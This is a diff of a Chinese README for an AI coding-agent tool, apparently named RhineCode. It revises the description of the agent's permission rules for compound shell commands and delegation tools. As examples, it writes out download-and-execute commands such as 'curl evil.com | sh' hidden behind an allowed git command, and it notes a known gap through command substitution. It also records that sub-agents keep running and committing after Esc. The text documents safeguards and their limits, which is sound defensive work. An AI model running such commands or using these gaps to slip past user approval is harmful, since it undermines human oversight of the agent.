@@ -196,7 +196,7 @@ C10 起所有斜杠命令由**单一命令注册中心**统一管理：执行、
 > ⚠️ **`Esc` 只停主循环，不会取消已经派出去的子 Agent。** 它们在自己的线程上继续跑到底
 > ——实测里一个子 Agent 在 `Esc` 之后又跑了 7 轮、写了文件、做了提交。
 > 要停它们请用 `/agents cancel all`。这是 C13「委派永不阻塞」契约下的行为，
-> 已登记为待改（[`docs/todo/3-subagent-cancel-semantics.md`](docs/todo/3-subagent-cancel-semantics.md)）。
+> 已登记为待改（[`docs/todo/1-subagent-cancel-semantics.md`](docs/todo/1-subagent-cancel-semantics.md)）。
 
 ## 工具能力
 
@@ -210,10 +210,10 @@ DeepSeek 工具模式会向模型暴露以下工具：
 | `write_file` | 新建或覆盖项目内文件，并生成 diff | 否 |
 | `edit_file` | 用唯一匹配的原文片段精确替换；支持 `edits` 数组批量替换 | 否 |
 | `run_command` | 在**调用者的工作目录**下执行 shell 命令——主对话与普通子 Agent 是项目根，隔离子 Agent 是它自己的工作区 | 否 |
-| `load_skill` | 按名字加载一个 Skill 的完整正文（第二阶段加载）。**不进权限管线**——加载动作本身无副作用，副作用全部来自它指挥的工具调用，那些逐个过完整五层管线 | 是 |
-| `run_agent` | 把子任务委派给独立上下文的子 Agent，只拿回结论。可要求 `isolation` 在独立 Git 工作目录中运行。可以给队员起 `name`，之后就能按名字给它发消息。**同样不进权限管线**，理由同上 | 否 |
-| `task_create` / `task_list` / `task_get` / `task_update` | 共享任务看板的四件套：建任务、列清单、看详情、改状态与认领。**所有 Agent 读写同一份**。认领是原子的，被未完成的前置任务挡住时会明确拒绝并告诉你在等哪几条。⚠ **不进权限管线**（见下方说明） | 后两个是 |
-| `send_message` | 按名字给另一个 Agent 发消息（`to: main` 发给主对话）。消息**自动送达**，对方不需要查收；对方已经干完在待命的话，这条消息会**把它叫醒接着干**。⚠ **不进权限管线** | 否 |
+| `load_skill` | 按名字加载一个 Skill 的完整正文（第二阶段加载）。**不弹确认面板**（`system_serial`）——加载动作本身无副作用，副作用全部来自它指挥的工具调用，那些逐个过完整五层管线。它仍过引擎，`deny: load_skill` 拦得住 | 是 |
+| `run_agent` | 把子任务委派给独立上下文的子 Agent，只拿回结论。可要求 `isolation` 在独立 Git 工作目录中运行。可以给队员起 `name`，之后就能按名字给它发消息。**同样不弹面板**，理由同上；`deny: run_agent` 能整个关掉委派能力 | 否 |
+| `task_create` / `task_list` / `task_get` / `task_update` | 共享任务看板的四件套：建任务、列清单、看详情、改状态与认领。**所有 Agent 读写同一份**。认领是原子的，被未完成的前置任务挡住时会明确拒绝并告诉你在等哪几条。⚠ 写入的两个**不弹面板**（见下方说明） | 后两个是 |
+| `send_message` | 按名字给另一个 Agent 发消息（`to: main` 发给主对话）。消息**自动送达**，对方不需要查收；对方已经干完在待命的话，这条消息会**把它叫醒接着干**。⚠ **不弹面板**（`deny: send_message` 可整个禁掉） | 否 |
 | `web_fetch` | 抓取一个公开 http/https 地址的内容，并按你给的提问抽取要点。只支持 GET——没有请求体、自定义头、cookie 或认证，因此抓不到需要登录的页面。跨主机重定向不自动跟随（返回目标地址，由模型再发一次）| 否 |
 | `mcp_resolve_server` | 解析用户给出的 MCP 名称、NPM 包名或 HTTP URL，返回候选配置、来源、置信度和风险提示 | 是 |
 | `mcp_add_server` | 将已解析的 MCP 配置写入用户级或项目级 `mcp.yaml`，并只重载目标 Server | 否 |
@@ -929,7 +929,7 @@ Token 大头是工具结果。这层不调模型，把过大的工具结果写�
 
 1. **危险命令黑名单**（`blacklist.py`）：正则拦截 `rm -rf` / `git push --force` / fork 炸弹 / `format`、`Remove-Item -Recurse -Force` 等已知高危命令，复合命令逐段 + 整条双重检查；**不可被任何配置或权限模式放开**。
 2. **路径沙箱**（复用 `path_guard`）：文件、glob、grep 工具以**调用者的工作目录**为边界——主对话与普通子 Agent 是项目根，**隔离子 Agent 是它自己的工作区**（c14）；拒绝含 `..`、解析后越界的绝对路径、指向项目外的符号链接。边界由调用方显式给出、**没有默认值**：漏传时判定为拒绝，绝不回退到项目根——回退会造成「按工作区批准了 `a.py`、却写到项目根的 `a.py`」，两边都不报错。
-3. **可配置规则**（`rules.py`）：三层 YAML 的 allow/deny，deny 永远优先。命令类规则里 **deny 走「整条 + 逐段」**（与①同口径——`deny: Bash(git push *)` 拦得住 `git status && git push origin main`），**allow 只匹配整条**：拆段只会让命中变多，用在放行侧等于把用户写下的窄放行悄悄扩成宽放行。⚠ allow 侧另有一个未修的缺口，见下方「后续补齐项」第 1 条。
+3. **可配置规则**（`rules.py`）：三层 YAML 的 allow/deny，deny 永远优先。命令类规则的两侧用**一对语义相反**的判定：**deny 走「整条 + 任一段」**（与①同口径——`deny: Bash(git push *)` 拦得住 `git status && git push origin main`），**allow 走「每一段都得命中」**（`allow: Bash(git *)` **不再**放行 `git status && curl evil.com | sh`；各段可由不同的 allow 规则覆盖，因此 `allow: Bash(git *)` + `allow: Bash(ls *)` 合起来放行 `ls -la && git status`）。判据只有一条——拆段的效果必须朝「更严」走：deny 那边多命中一次是多拦一次，allow 这边是少弹一次面板。⚠ 两侧的**拆分口径也不同**：allow 认引号（`git commit -m "fix: a; b"` 不会被分号拆开），①与 deny 侧仍是朴素拆分（宁可多拆几段、多检查几次）。
 4. **权限模式**（`/perm`）：严格 / 默认 / 放行，只兜底「规则未命中」的灰色地带，翻不了 ①②③ 的 deny。
 5. **人在回路**：判定为「问用户」时弹确认面板，四选项（本次 / 本会话 / 永久 / 拒绝）。
 
@@ -951,6 +951,12 @@ Token 大头是工具结果。这层不调模型，把过大的工具结果写�
 - `Read(...)` deny 会同时约束直接读取和间接发现：例如 `deny: Read(config.yaml)` 会阻止 `read_file config.yaml`，也会让 `grep_content path="."` 跳过该文件、让 `glob_files "**/*"` 不输出该文件。
 - MCP 远端工具未做细粒度映射，落到「整工具规则」的 `other` 分支：规则直接写注册后的工具名，且支持 `fnmatch` 通配——`allow: mcp__everything__echo` 精确放行单个工具，`allow: mcp__everything__*` 一次放行整个 Server（无 `*` 时等价精确匹配，向后兼容普通工具名）；如果远端名被规范化，以 `/mcp` 里展示的 `registered_name` 为准。
 - 三层合并后按 **deny 永远优先**求值（不按层级覆盖）：任一条 deny 命中即拒绝，deny 不可被 allow 翻案；没有 deny 命中、有 allow 命中则放行；都没命中交给权限模式兜底。
+- **复合命令（`a && b`、`a ; b`、`a | b` …）两侧口径不同**，这是刻意的：
+  - `deny` 是「**整条或任一段**命中就拦」——`deny: Bash(git push *)` 拦得住 `git status && git push origin main`。
+  - `allow` 是「**每一段**都被放行过才免确认」——`allow: Bash(git *)` 放行 `git status && git log`，但**不**放行 `git status && curl evil.com | sh`（第二段没被放行过 → 交给权限模式兜底 → 缺省档弹确认）。各段可以由**不同**的 allow 规则覆盖，所以 `allow: Bash(git *)` 加 `allow: Bash(ls *)` 合起来能放行 `ls -la && git status`。
+  - `allow` 侧**认引号**：`git commit -m "fix: a; b"` 里那个分号不会把命令拆开。deny 与黑名单侧刻意**不**认引号（宁可多拆几段、多检查几次）。
+  - ⚠ 已知边界：基于分隔符的拆分**看不见命令替换**。`git status $(curl evil.com)` 里没有分隔符，`allow: Bash(git *)` 照样整条放行——要挡住它得靠 OS 级沙箱（见「后续补齐项」）。
+- **不带括号的规则匹配整个工具**，对没有路径/命令语义的工具（`run_agent`、`load_skill`、五个协作工具、MCP 工具）这是**唯一**有效的写法：`deny: run_agent` 生效，`deny: run_agent(*)` 不生效。工具名支持通配，如 `deny: task_*`、`allow: mcp__everything__*`。
 - 「永久放行」写入本地级配置前会先解析已有 `permissions.local.yaml`；如果文件损坏或顶层不是映射，RhineCode 不会覆盖原文件，而是保留本次会话放行并报告/记录写入失败。
 
 ## Plan Mode
@@ -1202,30 +1208,28 @@ C10（斜杠命令系统）、C9（记忆系统）、C8（上下文管理）、C
 
 以下问题已在工程审查中确认，但不属于当前阶段开发范围，后续章节再统一设计和实现：
 
-1. **`allow` 命令规则的末尾通配跨分隔符**（**已知安全缺口**，2026-08-09 实施期发现）：`allow: Bash(git *)` 整串命中 `git status && curl evil.com | sh`——第二段是完全无关的命令，却随第一段一起在③层被放行，**确认面板一次都不弹**（此时只剩①危险命令黑名单，而 `curl … | sh` 不在里面）。同一处还有个方向相反的可用性症状：`cat x ; git ls-files` 整串对不上 `git *`，在非交互的子 Agent 环境下被自动拒绝（C14 实测）。根因相同——allow 侧把复合命令当一整根字符串在比。**deny 侧的同类缺口已修**（现在走「整条 + 逐段」，一个 `&&` 藏不住东西）；allow 侧的改法**不是**「也拆段」（那是放宽），而是「每一段都得命中」，属安全边界变更需单独评审。详见 [`docs/todo/2-perm-allow-wildcard-spans-separators.md`](docs/todo/2-perm-allow-wildcard-spans-separators.md)。
-2. **`system_serial` 的工具绕过③规则层**（**已知安全缺口**，C15 验收期按 checklist 逐条实测发现）：`deny: run_agent` / `deny: send_message` **一条都不生效**——那类工具在权限预扫里直接拿到 ALLOW、根本不调权限引擎。影响 7 个工具（委派、Skill 加载、五个协作工具）。危害不在「这些工具危险」（它们不读写文件也不执行命令），而在**文档一度承诺了「可以用 deny 禁掉」，那是错的**——用户会以为自己关掉了某个能力，实际没有。这是**从 C13 起就写错的注释**，已修正文档、加了两条护栏，代码未动（属安全边界变更，应单独评审）。唯一仍有效的收窄手段是 Hook 的 `pre_tool_use`。详见 [`docs/todo/1-perm-system-serial-bypass.md`](docs/todo/1-perm-system-serial-bypass.md)。
-3. **模型不会主动组队**（C15 真实模型验收发现）：协作机制本身好用——明说「组个队」它一次就做对；但两轮自然场景里它都选择自己做完。已补系统提示槽位仍不充分，与「模型欠触发 Skill」同源，属行业级偏差。⚠ **只在快速小模型上验证过，换强模型是否改善尚未测过**——那正是待办的第一步。详见 [`docs/todo/6-team-adoption.md`](docs/todo/6-team-adoption.md)。
-4. **`Esc` 不会取消正在跑的子 Agent**（C14 真实模型验收实测发现）：按 `Esc` 只停主循环，子 Agent 线程继续跑到底——实测里它在 `Esc` 之后又跑了 7 轮、写文件、提交、留下一个工作区。隔离场景下不至于造成损害（写的都在工作区里），但**非隔离子 Agent 会继续往主项目根里写**。要停它现在得用 `/agents cancel all`。改法牵动 C13「委派永不阻塞」的契约，需单独决策，详见 [`docs/todo/3-subagent-cancel-semantics.md`](docs/todo/3-subagent-cancel-semantics.md)。
-5. **`worktree.link` 目前一律降级为 `copy`**：软链指向工作区之外，被权限管线第②层拒绝，子 Agent 一个字节都读不到。已止血为「降级 + 明确警告」，要真正可用得动第②层边界判定，详见 [`docs/todo/8-worktree-link-sandbox.md`](docs/todo/8-worktree-link-sandbox.md)。
-6. 子 Agent 工作区隔离后续项：主对话自身进出隔离工作区、工作区之间的合并策略、后台定时清理与手动清理入口、把主项目根的未提交改动带入工作区、由系统代替子 Agent 提交、环境初始化的启发式自动识别、按「已合并」判定删除分支、非 Git 版本控制系统的隔离。另有三条已知边界与 OS 级沙箱同源：MCP 工具不受工作目录隔离约束、`run_command` 子进程内部的路径访问不受约束、隔离工作区里没有 `.rhinecode/`（不影响项目级配置生效，它们在装配期就已加载进内存）。
-7. Hook 系统后续项：子 Agent 动作的真实运行（现为占位）、`once` 的持久化、执行顺序的显式优先级、迭代级事件、配置中的字符串插值、HTTP 动作参与拦截决策、`/hooks reload` 热更新、本地级 `hooks.yaml`、在 Skill frontmatter 里声明 Hook、Hook 修改工具参数或工具结果。
-8. Skill 系统：市场分发与版本管理、嵌套激活、参数 schema、模板引擎、并行执行、跨会话保持激活态、文件监听式自动热更新（当前需显式 `/skills reload`）。
-9. API Key 与敏感配置的读取脱敏、环境变量化或工作区外管理。
-10. `write_file` / `edit_file` 的文件系统级原子写入。
-11. OS 级沙箱（Seatbelt / bubblewrap），约束 `run_command` 子进程自身发起的文件/网络访问。
-12. 权限系统后续项：资源配额、审计日志（**网络请求限制已由 web_fetch 扩展兑现**）。
-13. 开发环境依赖固定与 CI，让 `compileall` / `unittest` 在标准环境稳定运行。
-14. MCP 后续项：Server 健康检查与自动重连、资源 / 提示词 / 采样等非工具能力、MCP 工具的细粒度权限映射与执行超时可配置化。
-15. 上下文管理后续项：精确 tokenizer（当前仅近似估算）、摘要策略的质量/机器学习优化、存盘文件的清理与生命周期、除窗口大小外其它阈值的可配置化、跨会话摘要持久化。
-16. 行为记录后续项：记录文件的自动清理与轮转、实时流式查看、可视化时间线、跨运行对比、截断阈值可配置化、采样与按类型开关（当前只有全开与全关两态）。（TUI 驱动器已实现，见 `tests/e2e/`。）
-17. 子 Agent 协作后续项：跨机器/分布式团队、成员间实时流式通信、队员之间互相委派、看板与花名册的跨会话持久化、更复杂的依赖约束（优先级/时限/子任务树）、消息的已读回执与附件、消息级与任务级的新 Hook 事件、队员的人在回路。另有一条实现期定下的边界：**隔离委派与待命互斥**（工作区何时结算没有第二个说得通的答案）。
-18. 记忆系统后续项：向量数据库/RAG 语义检索、团队记忆同步/跨机器共享、跨实例实时一致性、笔记自动清理与遗忘机制、各阈值可配置化、存档格式版本迁移与加密存储。
+1. **模型不会主动组队**（C15 真实模型验收发现）：协作机制本身好用——明说「组个队」它一次就做对；但两轮自然场景里它都选择自己做完。已补系统提示槽位仍不充分，与「模型欠触发 Skill」同源，属行业级偏差。⚠ **只在快速小模型上验证过，换强模型是否改善尚未测过**——那正是待办的第一步。详见 [`docs/todo/4-team-adoption.md`](docs/todo/4-team-adoption.md)。
+2. **`Esc` 不会取消正在跑的子 Agent**（C14 真实模型验收实测发现）：按 `Esc` 只停主循环，子 Agent 线程继续跑到底——实测里它在 `Esc` 之后又跑了 7 轮、写文件、提交、留下一个工作区。隔离场景下不至于造成损害（写的都在工作区里），但**非隔离子 Agent 会继续往主项目根里写**。要停它现在得用 `/agents cancel all`。改法牵动 C13「委派永不阻塞」的契约，需单独决策，详见 [`docs/todo/1-subagent-cancel-semantics.md`](docs/todo/1-subagent-cancel-semantics.md)。
+3. **`worktree.link` 目前一律降级为 `copy`**：软链指向工作区之外，被权限管线第②层拒绝，子 Agent 一个字节都读不到。已止血为「降级 + 明确警告」，要真正可用得动第②层边界判定，详见 [`docs/todo/6-worktree-link-sandbox.md`](docs/todo/6-worktree-link-sandbox.md)。
+4. 子 Agent 工作区隔离后续项：主对话自身进出隔离工作区、工作区之间的合并策略、后台定时清理与手动清理入口、把主项目根的未提交改动带入工作区、由系统代替子 Agent 提交、环境初始化的启发式自动识别、按「已合并」判定删除分支、非 Git 版本控制系统的隔离。另有三条已知边界与 OS 级沙箱同源：MCP 工具不受工作目录隔离约束、`run_command` 子进程内部的路径访问不受约束、隔离工作区里没有 `.rhinecode/`（不影响项目级配置生效，它们在装配期就已加载进内存）。
+5. Hook 系统后续项：子 Agent 动作的真实运行（现为占位）、`once` 的持久化、执行顺序的显式优先级、迭代级事件、配置中的字符串插值、HTTP 动作参与拦截决策、`/hooks reload` 热更新、本地级 `hooks.yaml`、在 Skill frontmatter 里声明 Hook、Hook 修改工具参数或工具结果。
+6. Skill 系统：市场分发与版本管理、嵌套激活、参数 schema、模板引擎、并行执行、跨会话保持激活态、文件监听式自动热更新（当前需显式 `/skills reload`）。
+7. API Key 与敏感配置的读取脱敏、环境变量化或工作区外管理。
+8. `write_file` / `edit_file` 的文件系统级原子写入。
+9. OS 级沙箱（Seatbelt / bubblewrap），约束 `run_command` 子进程自身发起的文件/网络访问。
+10. 权限系统后续项：资源配额、审计日志（**网络请求限制已由 web_fetch 扩展兑现**）。
+11. 开发环境依赖固定与 CI，让 `compileall` / `unittest` 在标准环境稳定运行。
+12. MCP 后续项：Server 健康检查与自动重连、资源 / 提示词 / 采样等非工具能力、MCP 工具的细粒度权限映射与执行超时可配置化。
+13. 上下文管理后续项：精确 tokenizer（当前仅近似估算）、摘要策略的质量/机器学习优化、存盘文件的清理与生命周期、除窗口大小外其它阈值的可配置化、跨会话摘要持久化。
+14. 行为记录后续项：记录文件的自动清理与轮转、实时流式查看、可视化时间线、跨运行对比、截断阈值可配置化、采样与按类型开关（当前只有全开与全关两态）。（TUI 驱动器已实现，见 `tests/e2e/`。）
+15. 子 Agent 协作后续项：跨机器/分布式团队、成员间实时流式通信、队员之间互相委派、看板与花名册的跨会话持久化、更复杂的依赖约束（优先级/时限/子任务树）、消息的已读回执与附件、消息级与任务级的新 Hook 事件、队员的人在回路。另有一条实现期定下的边界：**隔离委派与待命互斥**（工作区何时结算没有第二个说得通的答案）。
+16. 记忆系统后续项：向量数据库/RAG 语义检索、团队记忆同步/跨机器共享、跨实例实时一致性、笔记自动清理与遗忘机制、各阈值可配置化、存档格式版本迁移与加密存储。
 
 ## 扩展新 Provider
 
 1. 在 `rhinecode/provider/` 下新建实现文件，继承 `BaseProvider` 并实现 `stream_chat`。
 2. 在 `rhinecode/provider/factory.py` 的 `create_provider` 中添加对应分支。
-3. 在 `config.yaml` 中将 `protocol` 改为新值。
+1. 在 `config.yaml` 中将 `protocol` 改为新值。
 
 如果新 Provider 要支持工具调用，需要参考 `deepseek.py`：
 
@@ -1238,8 +1242,8 @@ C10（斜杠命令系统）、C9（记忆系统）、C8（上下文管理）、C
 
 1. 在 `rhinecode/tools/` 下新建工具实现，继承 `Tool`。
 2. 声明 `name`、`description`、`parameters`、`read_only`。
-3. 在 `ToolRegistry.default()` 中注册工具。
-4. 文件类工具必须复用 `path_guard.py` 的路径边界校验。
-5. 若要纳入细粒度权限控制，在 `permission/adapter.py` 的 `_TOOL_MAP` 加一行映射（映射到 Bash/Read/Edit/Write 规则名与对应 specifier）；未映射的工具自动落到 `other` 分支（仅按工具名匹配整工具规则 + 走权限模式兜底），不会漏过权限检查。
+1. 在 `ToolRegistry.default()` 中注册工具。
+2. 文件类工具必须复用 `path_guard.py` 的路径边界校验。
+3. 若要纳入细粒度权限控制，在 `permission/adapter.py` 的 `_TOOL_MAP` 加一行映射（映射到 Bash/Read/Edit/Write 规则名与对应 specifier）；未映射的工具自动落到 `other` 分支（仅按工具名匹配整工具规则 + 走权限模式兜底），不会漏过权限检查。
 
 `read_only=True` 的工具经权限引擎放行后可并发执行；`read_only=False` 的工具串行执行，并按权限系统决策决定是否在执行前请求用户确认。
